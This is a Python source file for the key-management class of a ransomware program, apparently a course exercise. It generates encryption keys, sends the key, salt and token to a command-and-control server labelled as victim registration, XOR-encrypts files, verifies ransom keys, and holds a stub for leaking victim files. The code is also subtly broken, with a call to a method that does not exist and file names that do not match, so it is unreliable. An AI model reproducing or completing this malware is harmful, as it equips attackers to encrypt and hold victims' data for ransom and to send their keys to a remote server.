from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        KDF = PBKDF2HMAC(algorithm = hashes.SHA256(), length = self.KEY_LENGTH, salt=salt, iterations=self.ITERATION)
        return KDF.derive(key)

    def create(self)->Tuple[bytes, bytes, bytes]:
        salt = secrets.token_bytes(self.SALT_LENGTH)
        key = secrets.token_bytes(self.KEY_LENGTH)
        key_derived = self.do_derivation(salt,key)
        return salt, key, key_derived

    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        url = f"http://{self._remote_host_port}/new" # Creating the url
        # Creating dictionnary of the data to send in b64
        data = {             
            "token" : self.bin_to_b64(token),
            "salt" : self.bin_to_b64(salt),
            "key" : self.bin_to_b64(key)
        }
        # send of the request
        response = requests.post(url,json=data)
        # verify the status of the request
        if response.status_code !=200:
            self._log.error(f"Fail to send : {response.text}")
        else:
            self._log.info("Succes to send")

    def setup(self)->None:
        # data of encryption
        self._salt, self._key, self._token = self.create()
        # encryption data storage folder
        os.makedirs(self._path, exist_ok=True)

        # encryption data in files 
        with open(os.path.join(self._path,"salt.bin"), "wb") as salt_file:
            salt_file.write(self._salt)
        with open(os.path.join(self._path,"token.bin"),"wb") as token_file:
            token_file.write(self._token)

        # send encryption data in cnc
        self.post_new(self._salt, self._key, self._token)

    def load(self)->None:
        # function to load encryption data
        salt_file_path = os.path.join(self._path, "salt_data.bin")
        token_file_path = os.path.join(self._path, "token_data.bin")

        # existence of encryption data files
        if os.path.exists(salt_file_path) and os.path.exists(token_file_path):
            # load encryption data
            with open(salt_file_path, "rb") as salt_f:
                self._salt = salt_f.read()
            with open(token_file_path, "rb") as token_f:
                self._token = token_f.read()
        else:
            self._log.info("Encryption data does not exist")

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        token = self.do_derivation(self._salt, candidate_key)
        return token == self._token

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        candidate_key = base64.b64decode(b64_key)
        if self.verify_key(candidate_key):
            self._key = candidate_key
        else:
            raise ValueError("The key is invalid")

    def get_hex_token(self)->str:
        token_hash = sha256(self._token).hexdigest()
        return token_hash

    def xorfiles(self, files:List[str])->None:
        for file in files:
            try:
                xorfile(file, self._key)
            except Exception as erreur:
                self._log.error(f"Erreur du fichier {file}: {erreur}")

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        self._key = secrets.token_bytes(SecretManager.KEY_LENGTH)
        self._key = None
        self._salt = secrets.token_bytes(SecretManager.SALT_LENGTH)
        self._salt = None
        self._token = secrets.token_bytes(SecretManager.TOKEN_LENGTH)
        self._token = None